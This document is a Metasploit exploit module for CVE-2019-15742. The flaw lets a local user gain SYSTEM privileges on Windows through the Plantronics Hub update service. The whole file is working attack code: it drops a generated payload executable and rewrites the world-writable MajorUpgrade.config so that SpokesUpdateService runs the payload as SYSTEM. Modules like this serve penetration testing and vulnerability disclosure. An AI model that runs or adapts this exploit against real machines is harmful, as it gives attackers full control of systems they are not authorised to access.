# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::Services
  include Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Plantronics Hub SpokesUpdateService Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        The Plantronics Hub client application for Windows makes use of an
        automatic update service `SpokesUpdateService.exe` which automatically
        executes a file specified in the `MajorUpgrade.config` configuration
        file as SYSTEM. The configuration file is writable by all users by default.

        This module has been tested successfully on Plantronics Hub version 3.13.2
        on Windows 7 SP1 (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
      [
        &#039;Markus Krell&#039;, # Discovery and PoC
        &#039;bcoles&#039;        # Metasploit
      ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-15742&#039;],
          [&#039;EDB&#039;, &#039;47845&#039;],
          [&#039;URL&#039;, &#039;https://support.polycom.com/content/dam/polycom-support/global/documentation/plantronics-hub-local-privilege-escalation-vulnerability.pdf&#039;]
        ],
      &#039;Platform&#039;       => [&#039;win&#039;],
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;2019-08-30&#039;,
      &#039;DefaultOptions&#039; =>
        {
        },
      &#039;Notes&#039;          =>
        {
          &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ]
        },
      &#039;DefaultTarget&#039;  => 0))
    register_advanced_options [
      OptString.new(&#039;WritableDir&#039;, [false, &#039;A directory where we can write files (%TEMP% by default)&#039;, nil]),
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].blank? ? session.sys.config.getenv(&#039;TEMP&#039;) : datastore[&#039;WritableDir&#039;].to_s
  end

  def service_exists?(service)
    srv_info = service_info(service)

    if srv_info.nil?
      vprint_warning &#039;Unable to enumerate Windows services&#039;
      return false
    end

    if srv_info && srv_info[:display].empty?
      return false
    end

    true
  end

  def check
    service = &#039;PlantronicsUpdateService&#039;

    unless service_exists? service
      return CheckCode::Safe("Service &#039;#{service}&#039; does not exist")
    end

    path = "#{session.sys.config.getenv(&#039;PROGRAMDATA&#039;)}\\Plantronics\\Spokes3G"

    unless exists? path
      return CheckCode::Safe("Directory &#039;#{path}&#039; does not exist")
    end

    CheckCode::Detected
  end

  def exploit
    unless check == CheckCode::Detected
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    if is_system?
      fail_with Failure::BadConfig, &#039;Session already has SYSTEM privileges&#039;
    end

    payload_path = "#{base_dir}\\#{Rex::Text.rand_text_alphanumeric(8..10)}.exe"
    payload_exe = generate_payload_exe
    vprint_status "Writing payload to #{payload_path} ..."
    write_file payload_path, payload_exe
    register_file_for_cleanup payload_path

    config_path = "#{session.sys.config.getenv(&#039;PROGRAMDATA&#039;)}\\Plantronics\\Spokes3G\\MajorUpgrade.config"
    vprint_status "Writing configuration file to #{config_path} ..."
    write_file config_path, "#{session.sys.config.getenv(&#039;USERNAME&#039;)}|advertise|#{payload_path}"
    register_file_for_cleanup config_path
  end
end

